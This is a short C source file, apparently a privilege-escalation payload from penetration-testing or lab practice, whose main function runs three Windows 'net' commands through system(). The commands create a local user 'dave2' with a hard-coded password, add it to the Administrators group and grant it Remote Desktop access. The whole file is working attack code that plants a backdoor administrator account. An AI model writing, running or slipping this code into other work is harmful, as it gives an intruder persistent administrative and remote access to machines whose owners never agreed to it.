#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'remote desktop users' dave2 /add");

  
  return 0;
}
